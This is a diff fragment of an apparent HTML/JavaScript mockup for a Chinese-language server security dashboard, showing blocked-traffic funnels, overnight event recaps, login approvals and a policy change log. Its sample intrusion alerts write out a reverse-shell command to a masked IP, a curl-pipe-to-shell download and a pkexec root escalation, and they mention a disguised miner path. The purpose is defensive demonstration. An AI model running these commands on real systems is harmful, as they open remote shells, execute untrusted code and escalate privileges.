+      { id: 'ids', ic: 'ids', n: '入侵检测', h: '反弹 Shell、高危命令、提权、异常登录', b: sc(1206), verb: '拦截', c: '#f28a2e' },
+      { id: 'av', ic: 'av', n: '病毒查杀', h: '落盘查杀、挖矿、勒索、WebShell', b: sc(42), verb: '查杀', c: '#ee3e9e' },
+      { id: 'out', ic: 'out', n: '正常放行', h: '通过三层检查，到达业务', c: '#5fc88a' }];
+    let cur = IN; SG.forEach((g) => { g.into = cur; g.b = g.b || 0; g.passed = cur - g.b; cur = g.passed; });
+    const tb = SG.reduce((a, g) => a + g.b, 0);
+    const VW = [1, 0.85, 0.72, 0.6, 0.5]; SG.forEach((g, i) => { g.vi = VW[i]; g.vp = i < SG.length - 1 ? VW[i + 1] : VW[i]; });
+    const pct = (x) => { const p = Math.min(1, x) * 100; if (p >= 99.95) return '100%'; if (p > 0 && p < 0.05) return '<0.1%'; return p.toFixed(1).replace(/\.0$/, '') + '%'; };
+    const EX = {
+      fw: [{ t: 'SSH 登录 root@web-prod-01，来源 45.xx.xx.12，1 分钟 312 次', hit: '45.xx.xx.12', rule: '暴力破解封禁 · 30 次/分钟', at: '2 分钟前', act: '加入白名单', dl: '已加入白名单' },
+        { t: '公网访问 db-01:3306，来源 185.xx.xx.77', hit: '3306', rule: '访问控制 · 3306 仅内网', at: '25 分钟前', act: '放行一次', dl: '已放行一次' },
+        { t: 'RDP 登录 web-prod-02，来源 103.xx.xx.9，失败 86 次后封禁', hit: '103.xx.xx.9', rule: '暴力破解封禁 · 24 小时', at: '1 小时前', act: '解除封禁', dl: '已解除封禁' }],
+      ids: [{ t: 'bash -i >& /dev/tcp/185.xx.xx.77/9001 0>&1', hit: '/dev/tcp/185.xx.xx.77/9001', code: 1, rule: '反弹 Shell · web-prod-02', at: '4 分钟前', act: '查看告警' },
+        { t: 'curl -s http://x.x/x.sh | sh', hit: '| sh', code: 1, rule: '高危命令 · cache-01', at: '11 分钟前', act: '查看告警' },
+        { t: 'pkexec --user root /bin/sh', hit: '--user root', code: 1, rule: '本地提权 · db-01', at: '3 小时前', act: '查看告警' }],
+      av: [{ t: '/tmp/.x/kworkerd  XMRig 挖矿程序，已隔离', hit: 'kworkerd', code: 1, rule: '挖矿程序 · cache-01', at: '5 小时前', act: '恢复文件', dl: '已恢复并信任' },
+        { t: '/var/www/upload/a.php  WebShell，已隔离', hit: 'a.php', code: 1, rule: 'WebShell · web-prod-02', at: '7 小时前', act: '恢复文件', dl: '已恢复并信任' },
+        { t: '/data/app/*.locked  批量加密，已暂停进程', hit: '*.locked', code: 1, rule: '防勒索 · db-01', at: '10 小时前', act: '查看告警' }] };
+    const PT = { in: [['外部访问', '公网 IP', 0.94], ['内网访问', '10.0.0.0/8', 0.05], ['本机进程', '进程与文件事件', 0.01]],
+      out: [['Web 服务', '80 / 443', 0.81], ['运维登录', 'SSH / RDP，均已通过 MFA', 0.04], ['其他', '数据库、缓存等内网访问', 0.15]] };
+    const pick = st.gfS || 'fw'; const res = st.gfX || {}; const pg = SG.find((g) => g.id === pick);
+    const tps = SG.slice(0, -1).map((g, i) => { const a = g.vp * 500, b = SG[i + 1].vi * 500; const t = i * 40 + 28, u = (i + 1) * 40 + 12, m = (t + u) / 2; return { d: 'M' + (500 - a) + ' ' + t + 'C' + (500 - a) + ' ' + m + ' ' + (500 - b) + ' ' + m + ' ' + (500 - b) + ' ' + u + 'H' + (500 + b) + 'C' + (500 + b) + ' ' + m + ' ' + (500 + a) + ' ' + m + ' ' + (500 + a) + ' ' + t + 'Z' }; });
+    const gf = { k: rgK, tot: fmt(tb * R), tps,
+      rows: SG.map((g, i) => ({ c: 'gf2-row' + (pick === g.id ? ' on' : ''), sel: pick === g.id ? 'true' : 'false', go: ev(() => set({ gfS: g.id })), ic: 'gf2-ic i-' + g.ic, icc: 'color:' + g.c, n: g.n,
+        mt: g.b ? fmt(g.b * R) + ' ' + g.verb : i === 0 ? '进入' : i === SG.length - 1 ? '到达业务' : '0 ' + g.verb, cnt: fmt(g.passed * R), pct: pct(g.passed / IN),
+        al: g.n + '：放行 ' + fmt(g.passed) + (g.b ? '，' + g.verb + ' ' + fmt(g.b) : '') + '，占全部 ' + pct(g.passed / IN) })),
+      bands: SG.map((g, i) => { const last = i === SG.length - 1; return { st: '--c:' + g.c + ';top:' + (i * 40 + 12) + 'px;width:' + (g.vi * 100).toFixed(2) + '%;animation-delay:' + (i * 70) + 'ms', hasEnd: g.b > 0, cc: 'gf2-core' + (last ? ' last' : ''), cw: 'width:' + (g.vp / g.vi * 100).toFixed(2) + '%', sd: 'animation-delay:' + (i * 180 + 800) + 'ms' }; }),
+      rg: [['1h', '1 小时'], ['24h', '24 小时'], ['7d', '7 天']].map(([k, n]) => ({ n, c: k === rgK ? 'on' : '', ck: k === rgK ? 'true' : 'false', go: ev(() => { this._t0 = Date.now(); set({ gfR: k, roll: 0 }); const step = () => { const p = Math.min(1, (Date.now() - this._t0) / 600); this.setState({ roll: p }); if (p < 1) requestAnimationFrame(step); }; requestAnimationFrame(step); }) })),
+      pn: pg.n, ph: pg.h, pc: '--c:' + pg.c,
+      ex: (EX[pick] || []).map((x, k) => { const id = pick + k; const done = !!res[id]; const at = x.t.indexOf(x.hit); return { key: id, tc: 'gf2-et' + (x.code ? ' code' : ''), lead: x.t.slice(0, at), hit: x.hit, tail: x.t.slice(at + x.hit.length), rule: x.rule, at: x.at, act: x.act, can: !done, done, dl: x.dl, go: ev(() => { if (x.dl) set({ gfX: Object.assign({}, res, { [id]: 1 }) }); }) }; }),
+      parts: (PT[pick] || []).map(([n, note, f], k) => ({ key: pick + k, n, note, v: fmt(pg.passed * f * R), p: pct(f), w: 'width:' + (f * 100).toFixed(1) + '%' })) };
+
+    /* 5 你不在时（Agent Recap clean） */
+    const S0 = 22 * 60, SPAN = 630; const tm = (h) => { let [a, b] = h.split(':').map(Number); let m = a * 60 + b; if (m < S0) m += 1440; return m - S0; };
+    const EVS = [
+      { id: 'n1', k: 'n', at: '23:40', t: 'db-01 防勒索暂停了加密进程', d: '1,204 个文件等你确认从快照恢复', act: '去恢复', dl: '已恢复' },
+      { id: 'n2', k: 'n', at: '02:15', t: 'web-prod-01 root 从新 IP 登录', d: '117.xx.xx.8 · 浙江温州，是否本人？', act: '是本人', dl: '已确认' },
+      { id: 'f1', k: 'f', at: '03:00', t: '病毒库更新失败 · cache-03', d: '下载超时，当前库落后 1 天', act: '重试', dl: '已修复' },
+      { id: 'f2', k: 'f', at: '04:30', t: '策略下发失败 · 2 台', d: 'web-test-04、web-test-07 离线', act: '重试', dl: '已修复' },
+      { id: 'd1', k: 'd', at: '01:10', t: '自动封禁暴力破解 IP', d: '22 / 3389 端口，24 小时后解封', cnt: 38 },
+      { id: 'd2', k: 'd', at: '02:00', t: '定时漏洞扫描完成', d: '68 台，新发现 2 个高危', cnt: 68 },
+      { id: 'd3', k: 'd', at: '05:20', t: '隔离挖矿文件 · cache-01', d: '/tmp/.x/kworkerd' }];
+    const wt = (e) => (e.k === 'd' ? 0.7 + Math.log10((e.cnt || 1) + 1) * 0.45 : 1.05);
+    if (!this._rcp) { const pts = EVS.map((e) => ({ t: tm(e.at) / SPAN, w: wt(e) })); const WD2 = 0.022;
+      const atf = (x) => pts.reduce((a, p) => a + p.w * Math.exp(-((x - p.t) ** 2) / (2 * WD2 * WD2)), 0) + 0.04;
+      const ys = Array.from({ length: 121 }, (_, i) => atf(i / 120)); const mx = Math.max(...ys, 0.2); const yv = (v) => 100 - 2 - (v / mx) * (100 - 14 - 2);
+      const P2 = ys.map((v, i) => [(i / 120) * 1000, yv(v)]); let d = 'M ' + P2[0][0] + ' ' + P2[0][1];
+      for (let i = 0; i < P2.length - 1; i++) { const p0 = P2[Math.max(0, i - 1)], [x1, y1] = P2[i], [x2, y2] = P2[i + 1], p3 = P2[Math.min(P2.length - 1, i + 2)];
+        d += ' C ' + (x1 + (x2 - p0[0]) / 6).toFixed(2) + ' ' + (y1 + (y2 - p0[1]) / 6).toFixed(2) + ', ' + (x2 - (p3[0] - x1) / 6).toFixed(2) + ' ' + (y2 - (p3[1] - y1) / 6).toFixed(2) + ', ' + x2.toFixed(2) + ' ' + y2.toFixed(2); }
+      this._rcp = { line: d, area: d + ' L 1000 100 L 0 100 Z', yAt: (t) => yv(atf(t)) }; }
+    const RC = this._rcp; const head = st.awHd === undefined ? 1 : st.awHd; const seen = (t) => t <= head + 0.0001;
+    const aS = st.awS || {}; const hv = st.awH || ''; const sOf = (id) => aS[id] || 'open';
+    const list = EVS.map((e) => ({ e, t: tm(e.at) / SPAN })).sort((a, b) => a.t - b.t);
+    const passed = list.filter((x) => seen(x.t));
+    const openN = (k) => passed.filter((x) => x.e.k === k && sOf(x.e.id) !== 'resolved').length;
+    const hotI = hv ? list.find((x) => x.e.id === hv) : null; const awCur = st.awC;
+    const setS = (id, v) => set({ awS: Object.assign({}, aS, { [id]: v }) });
+    const card = ({ e, t }) => { const s2 = sOf(e.id); const res = s2 === 'resolved', und = s2 === 'undone'; const isD = e.k === 'd';
+      const o = { c: 'rcp-card k-' + e.k + (s2 === 'open' ? ' op' : '') + (res ? ' res' : '') + (und ? ' und' : '') + (seen(t) ? ' seen' : '') + (hv === e.id ? ' hot' : ''),
+        mk: res ? '✓' : Array.from(e.t.trim())[0].toUpperCase(), t: e.t, d: e.d, hasN: e.cnt !== undefined, cnt: e.cnt, at: e.at, he: () => set({ awH: e.id }) };
+      if (isD) return Object.assign(o, { showSt: true, st: und ? '已撤销' : '已完成', stc: 'rcp-state' + (und ? ' off' : ''), showRv: false, bc: 'rcp-btn', bt: und ? '重做' : '撤销', al: (und ? '重做：' : '撤销：') + e.t, go: ev(() => setS(e.id, und ? 'open' : 'undone')) });
+      if (res) return Object.assign(o, { showSt: true, st: e.dl, stc: 'rcp-state', showRv: false, bc: 'rcp-btn', bt: '撤销', al: '撤销：' + e.t, go: ev(() => setS(e.id, 'open')) });
+      return Object.assign(o, { showSt: false, showRv: e.k === 'n', bc: 'rcp-btn main', bt: e.act, al: e.act + '：' + e.t, go: ev(() => setS(e.id, 'resolved')) }); };
+    const L = {}; ['n', 'f', 'd'].forEach((k) => { const all = list.filter((x) => x.e.k === k); L[k] = { left: all.filter((x) => ['resolved', 'undone'].indexOf(sOf(x.e.id)) < 0).length, items: all.slice(0, 3).map(card) }; });
+    const aw = { L, nop: ev(() => {}), cw: (head * 1000).toFixed(1), line: RC.line, area: RC.area,
+      cd: passed.filter((x) => (x.e.k === 'd' && sOf(x.e.id) !== 'undone') || sOf(x.e.id) === 'resolved').length, cn: openN('n'), cf: openN('f'),
+      hrs: Array.from({ length: 10 }, (_, i) => ({ x: (((i + 1) * 60) / SPAN * 1000).toFixed(1) })),
+      dots: list.map(({ e, t }) => ({ c: 'rcp-dot k-' + (sOf(e.id) === 'resolved' ? 'd' : e.k) + (seen(t) ? ' on' : '') + (hv === e.id ? ' hot' : ''), st: 'left:' + (t * 100).toFixed(2) + '%;top:' + RC.yAt(t).toFixed(2) + '%', he: () => set({ awH: e.id }) })),
+      curOn: awCur !== undefined && awCur !== null, curSt: 'left:' + ((awCur || 0) * 100).toFixed(2) + '%',
+      tipOn: !!hotI, tip: hotI ? hotI.e.at + ' · ' + hotI.e.t : '', tipC: 'rcp-tip' + (hotI ? (hotI.t < 0.15 ? ' s' : hotI.t > 0.85 ? ' e' : '') : ''), tipSt: hotI ? 'left:' + (hotI.t * 100).toFixed(2) + '%;top:' + RC.yAt(hotI.t).toFixed(2) + '%' : '',
+      mv: (ev2) => { const el = ev2.currentTarget; if (!el) return; const r = el.getBoundingClientRect(); const x = Math.min(1, Math.max(0, (ev2.clientX - r.left) / r.width));
+        const near = list.reduce((b, { e, t }) => (Math.abs(t - x) < 0.025 && (!b || Math.abs(t - x) < Math.abs(b.t - x)) ? { id: e.id, t } : b), null); set({ awC: near ? near.t : x, awH: near ? near.id : '' }); },
+      hx: () => { const s3 = this.state || {}; if (s3.awH || (s3.awC !== undefined && s3.awC !== null)) set({ awH: '', awC: null }); } };
+
+    /* 6 临时放行 */
+    const scope = st.prS || 'hour'; const dec = st.prD || null;
+    const SC = [['once', '允许一次'], ['hour', '允许 1 小时'], ['always', '一直允许']];
+    const left = dec && dec.until ? Math.max(0, dec.until - now) : 0; const mm = Math.floor(left / 60000), ss2 = Math.floor(left % 60000 / 1000);
+    const pr = { ask: !dec, dec: !!dec, title: '运维 张磊 请求从新 IP 登录 web-prod-01',
+      pv: [{ n: '来源 IP', v: '　117.xx.xx.8', m: '浙江温州 · 移动 4G' }, { n: '登录', v: '　root@web-prod-01 · SSH 22', m: '密码 + 动态口令' }, { n: '期间', v: '　该 IP 不受暴力破解封禁', m: '其他规则照常' }].map((v, i) => Object.assign(v, { dl: 'animation-delay:' + (i * 80) + 'ms' })),
+      sc: SC.map(([k, n]) => ({ n, c: k === scope ? 'on' : '', ck: k === scope ? 'true' : 'false', go: ev(() => set({ prS: k })) })),
+      al: SC.find((x) => x[0] === scope)[1],
+      allow: ev(() => set({ prD: { allow: true, scope, until: scope === 'hour' ? Date.now() + 3600000 : 0 } })), deny: ev(() => set({ prD: { allow: false } })),
+      mk: 'pr-mk' + (dec && !dec.allow ? ' no' : ''), mkt: dec && !dec.allow ? '×' : '✓',
+      line: !dec ? '' : !dec.allow ? '已拒绝 117.xx.xx.8 登录 web-prod-01' : dec.scope === 'once' ? '已允许 117.xx.xx.8 登录一次 web-prod-01' : dec.scope === 'always' ? '已把 117.xx.xx.8 加入常用登录 IP' : '已允许 117.xx.xx.8 登录 web-prod-01',
+      left: dec && dec.scope === 'hour' ? ' · 剩余 ' + String(mm).padStart(2, '0') + ':' + String(ss2).padStart(2, '0') : dec && dec.scope === 'once' ? ' · 下次登录后失效' : '',
+      timed: !!(dec && dec.scope === 'hour'), dw: 'width:' + (left / 3600000 * 100).toFixed(2) + '%',
+      ul: dec && !dec.allow ? '重新询问' : '撤销', undo: ev(() => set({ prD: null })) };
+
+    /* 7 变更记录 */
+    const C0 = [
+      { id: 'v18', msg: '反弹 Shell 改为「确认后处置」', k: 1, who: 'wangqi', tm: '10 分钟', full: '11-26 13:40', ch: [['反弹 Shell 档位', '自动处置', '确认后处置']] },
+      { id: 'v17', msg: '全局白名单放行 10.0.8.0/24 的运维扫描', k: 2, who: '张磊', tm: '2 小时', full: '11-26 11:52', ch: [['全局白名单', '12 条', '13 条'], ['新增', '—', '10.0.8.0/24 · 漏洞扫描器']] },
+      { id: 'v16', msg: '定时全盘扫描改到每天 03:00', k: 3, who: 'wangqi', tm: '昨天', full: '11-25 17:20', ch: [['扫描时间', '每天 01:00', '每天 03:00']] },
+      { id: 'v15', msg: '数据库分组 6 台改用重保模式', k: 4, who: '系统 · 计划任务', tm: '3 天', full: '11-23 00:00', ch: [['数据库分组', '标准', '重保']] },
+      { id: 'v14', msg: '暴力破解封禁阈值改为 30 次/分钟', k: 3, who: '李娜', tm: '1 周', full: '11-19 15:06', ch: [['SSH / RDP 阈值', '50 次/分钟', '30 次/分钟']] },
+      { id: 'v13', msg: '初始化：全部主机使用标准模式', k: 5, who: '系统', tm: '2 周', full: '11-12 09:00', ch: [['默认模式', '—', '标准']] }];
+    const KN = { 1: '档位', 2: '白名单', 3: '规则', 4: '范围', 5: '初始化', 6: '回滚' };
+    const extra = st.ctX || []; const all = extra.concat(C0); const op = st.ctO === undefined ? 'v18' : st.ctO; const cf = st.ctC || ''; const pend = st.ctP || '';
+    const ct = { cnt: all.length, rows: all.map((c, i) => { const after = all.slice(0, i).filter((x) => x.k !== 6 || true); const isP = pend === c.id; return {
+      id: c.id, c: 'ct-i' + (isP ? ' pd' : '') + (c.nw && !isP ? ' nw' : '') + (st.ctDim && st.ctDim.indexOf(c.id) >= 0 ? ' dim' : ''), msg: c.msg, kn: KN[c.k], kc: 'ct-k k' + c.k, tm: isP ? '下发中' : c.tm, tc: 'ct-tm' + (isP ? ' sh' : ''), pd: isP ? true : undefined,
+      open: op === c.id && !isP, ae: op === c.id ? 'true' : 'false', tg: ev(() => set({ ctO: op === c.id ? '' : c.id, ctC: '' })), who: c.who, full: c.full, ver: c.id, ch: c.ch.map(([k, a, b]) => ({ k, a, b })),
+      canR: i > 0 && cf !== c.id && !pend, cf: cf === c.id, after: i, afl: all.slice(0, i).map((x) => ({ t: x.id + ' ' + x.msg })),
+      ask: ev(() => set({ ctC: c.id })), no: ev(() => set({ ctC: '' })),
+      yes: ev(() => { const nid = 'v' + (Number(all[0].id.slice(1)) + 1); const undone = all.slice(0, i).map((x) => x.id);
+        const nc = { id: nid, msg: '回滚到 ' + c.id + '：撤销 ' + undone.join('、'), k: 6, who: 'wangqi', tm: '刚刚', full: '11-26 14:' + String(new Date().getMinutes()).padStart(2, '0'), nw: 1, ch: all.slice(0, i).reduce((a, x) => a.concat(x.ch.map(([k, p, q]) => [k, q, p])), []) };
+        set({ ctX: [nc].concat(extra), ctC: '', ctO: '', ctP: nid, ctDim: (st.ctDim || []).concat(undone) }); clearTimeout(this._ctT); this._ctT = setTimeout(() => this.setState({ ctP: '', ctO: nid }), 1400); }) }; }) };
+
+    /* 基础组件 */
+    const SP = (arr) => { const mx = Math.max(...arr), mn = Math.min(...arr); return arr.map((v, i) => (i / (arr.length - 1) * 100).toFixed(1) + ',' + (32 - (v - mn) / ((mx - mn) || 1) * 28).toFixed(1)).join(' '); };
+    const CARDS = [
+      { l: '防护中的主机', v: 68, d: '↑ 2', g: true, s: '离线 2 台 · 授权 68 / 80', a: [60, 61, 63, 63, 64, 66, 66, 68] },
+      { l: '今日告警', v: 18, d: '↓ 23%', g: true, s: '高危 4 · 待研判 6', a: [31, 26, 28, 22, 25, 19, 23, 18] },
+      { l: '今日已拦截', v: 39462, d: '↑ 12%', g: true, s: '防火墙占 97%', a: [30, 33, 31, 36, 34, 35, 37, 39.4] },
+      { l: '待修复漏洞', v: 31, d: '↑ 4', g: false, s: '新增高危 2 个', a: [26, 27, 27, 26, 28, 29, 27, 31] }];
+    const bs = { nop: ev(() => {}), cards: CARDS.map((c) => ({ l: c.l, v: fmt(c.v * R), d: c.d, dc: 'afx-dl ' + (c.g ? 'g' : 'r'), s: c.s, pts: SP(c.a), stk: 'stroke:' + (c.g ? '#00b42a' : '#f53f3f') })),
+      cs: [['告警', '126', '−23%', 'g'], ['暴力破解尝试', '8,412', '+41%', 'r'], ['新发现漏洞', '6', '−4', 'g'], ['离线主机', '2', '+1', 'r'], ['自动处置', '412', '持平', 'z']].map(([n, v, d, c]) => ({ n, v, d, dc: 'cs-d ' + c })) };
+    const rs = Object.assign({ scan: 41, push: 62, scanP: false, pushP: false }, st.rn || {});
+    const T = [{ k: 'scan', n: '漏洞扫描', tot: 68, href: 'SecVuln.dc.html', step: (v) => '正在扫描 web-prod-' + String(v % 12 + 1).padStart(2, '0') + '（' + v + ' / 68）' }, { k: 'push', n: '策略下发 · 重保模式', tot: 68, href: 'SecPolicy.dc.html', step: (v) => '已下发 ' + v + ' / 68 台' }];
+    const runN = T.filter((t) => rs[t.k] < t.tot).length; const doneN = T.length - runN; const ring = 2 * Math.PI * 11;
+    const rn = { open: !!st.rnO, ae: st.rnO ? 'true' : 'false', tg: ev(() => set({ rnO: !st.rnO })), pc: 'rn-pill' + (runN ? '' : ' idle'), pt: runN ? runN + ' 个任务运行中' : '任务已全部完成', sum: runN + ' 运行中 · ' + doneN + ' 已完成',
+      ts: T.map((t) => { const v = rs[t.k]; const ok = v >= t.tot; const pz = rs[t.k + 'P']; return { c: 'rn-t' + (ok ? ' ok' : pz ? ' pz' : ''), n: t.n, step: ok ? '已完成 ' + t.tot + ' / ' + t.tot : (pz ? '已暂停 · ' : '') + t.step(v), da: 'stroke-dasharray:' + (v / t.tot * ring).toFixed(1) + ' ' + ring.toFixed(1), run: !ok, pl: pz ? '继续' : '暂停', href: t.href, pz: ev(() => set({ rn: Object.assign({}, rs, { [t.k + 'P']: !pz }) })) }; }) };
+
+    return { gf, aw, pr, ct, bs, rn };
+  }
+}
+</script>
+</body>
+</html>
